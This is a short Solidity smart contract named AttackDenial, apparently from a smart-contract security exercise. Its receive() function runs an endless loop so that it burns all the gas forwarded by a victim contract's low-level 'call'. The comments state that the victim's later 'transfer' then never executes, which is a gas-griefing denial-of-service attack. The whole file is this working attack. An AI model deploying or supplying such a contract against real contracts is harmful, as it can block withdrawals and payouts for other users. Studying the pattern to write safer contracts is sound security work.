// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackDenial {
    receive() external payable {
        // Consume all the available gas forwarded from the withdraw function using the "call" to send ethers
        // Then "transfer" will never be executed, due to "call" consuming all gas
        while (true) {}
    }
}
